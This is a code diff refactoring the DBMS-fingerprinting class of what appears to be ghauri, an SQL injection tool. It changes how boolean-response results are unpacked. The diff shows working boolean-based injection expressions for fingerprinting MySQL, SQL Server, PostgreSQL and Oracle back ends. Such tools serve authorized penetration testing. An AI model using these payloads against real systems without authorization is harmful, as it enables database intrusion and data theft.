@@ -41,7 +41,6 @@ from ghauri.common.utils import (
 class FingerPrintDBMS:
     """
     this class will finger print database in case of boolean based injection
-    # CVAR(NULL) ACCESS (SELECT CVAR(NULL) FROM MSysAccessObjects) IS NULL
     """
 
     def __init__(
@@ -118,7 +117,7 @@ class FingerPrintDBMS:
             attack01 = self.check_boolean_expression(
                 expression="(SELECT 0x47776a68)='qSBB'"  # "(SELECT 0x47776a68)=0x47776a65"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 attack01,
@@ -127,6 +126,7 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             if result:
                 is_ok = False
                 if self._attacks:
@@ -154,7 +154,7 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="(SELECT QUARTER(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 self.attack01,
@@ -163,13 +163,14 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             ok = False
             if result:
                 logger.info(f"confirming MySQL")
                 attack = self.check_boolean_expression(
                     expression="SESSION_USER() LIKE USER()"
                 )
-                result, case, _ = check_boolean_responses(
+                bool_retval = check_boolean_responses(
                     self.base,
                     attack,
                     self.attack01,
@@ -178,12 +179,13 @@ class FingerPrintDBMS:
                     code=self.code,
                     text_only=self.text_only,
                 )
+                result = bool_retval.vulnerable
                 if not result:
                     # Note: MemSQL doesn't support SESSION_USER()
                     attack = self.check_boolean_expression(
                         expression="GEOGRAPHY_AREA(NULL) IS NULL"
                     )
-                    result, case, _ = check_boolean_responses(
+                    bool_retval = check_boolean_responses(
                         self.base,
                         attack,
                         self.attack01,
@@ -192,6 +194,8 @@ class FingerPrintDBMS:
                         code=self.code,
                         text_only=self.text_only,
                     )
+                    result = bool_retval.vulnerable
+                    case = bool_retval.case
                 if not result:
                     warnMsg = "the back-end DBMS is not MySQL"
                     logger.warning(warnMsg)
@@ -222,7 +226,7 @@ class FingerPrintDBMS:
                     safe="=%",
                 )
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 attack01,
@@ -231,6 +235,7 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             if result:
                 is_ok = False
                 if self._attacks:
@@ -258,7 +263,7 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="UNICODE(SQUARE(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 self.attack01,
@@ -267,6 +272,7 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             ok = False
             if result:
                 logger.info(f"confirming Microsoft SQL Server")
@@ -287,7 +293,7 @@ class FingerPrintDBMS:
                     )
                     _ = bool(attack.redirected == lattack.redirected)
                     if _:
-                        result, case, _ = check_boolean_responses(
+                        bool_retval = check_boolean_responses(
                             self.base,
                             attack,
                             self.attack01,
@@ -296,6 +302,7 @@ class FingerPrintDBMS:
                             code=self.code,
                             text_only=self.text_only,
                         )
+                        result = bool_retval.vulnerable
                         if result:
                             db_version = f" {version}"
                             break
@@ -320,7 +327,7 @@ class FingerPrintDBMS:
             attack01 = self.check_boolean_expression(
                 expression="(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))='QxXT'"  # "(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))=(CHR(76)||CHR(110)||CHR(85)||CHR(94))"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 attack01,
@@ -329,6 +336,7 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             if result:
                 is_ok = False
                 if self._attacks:
@@ -356,7 +364,7 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="CONVERT_TO((CHR(115)||CHR(120)||CHR(115)||CHR(101)), QUOTE_IDENT(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 self.attack01,
@@ -365,13 +373,14 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             ok = False
             if result:
                 logger.info(f"confirming PostgreSQL")
                 attack = self.check_boolean_expression(
                     expression="COALESCE(8009, NULL)=8009"
                 )
-                result, case, _ = check_boolean_responses(
+                bool_retval = check_boolean_responses(
                     self.base,
                     attack,
                     self.attack01,
@@ -380,6 +389,7 @@ class FingerPrintDBMS:
                     code=self.code,
                     text_only=self.text_only,
                 )
+                result = bool_retval.vulnerable
                 if not result:
                     warnMsg = "the back-end DBMS is not PostgreSQL"
                     logger.warning(warnMsg)
@@ -405,7 +415,7 @@ class FingerPrintDBMS:
             attack01 = self.check_boolean_expression(
                 expression="(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)='SOTQ'"  # "(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)=CHR(112)||CHR(116)||CHR(90)||CHR(76)"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 attack01,
@@ -414,6 +424,7 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             if result:
                 is_ok = False
                 if self._attacks:
@@ -441,7 +452,7 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="LENGTH(SYSDATE)=LENGTH(SYSDATE)"
             )
-            result, case, _ = check_boolean_responses(
+            bool_retval = check_boolean_responses(
                 self.base,
                 attack,
                 self.attack01,
@@ -450,13 +461,14 @@ class FingerPrintDBMS:
                 code=self.code,
                 text_only=self.text_only,
             )
+            result = bool_retval.vulnerable
             ok = False
             if result:
                 logger.info(f"confirming Oracle")
                 attack = self.check_boolean_expression(
                     expression="NVL(RAWTOHEX(5984),5984)=RAWTOHEX(5984)"
                 )
-                result, case, _ = check_boolean_responses(
+                bool_retval = check_boolean_responses(
                     self.base,
                     attack,
                     self.attack01,
@@ -465,6 +477,7 @@ class FingerPrintDBMS:
                     code=self.code,
                     text_only=self.text_only,
                 )
+                result = bool_retval.vulnerable
                 if not result:
                     warnMsg = "the back-end DBMS is not Oracle"
                     logger.warning(warnMsg)
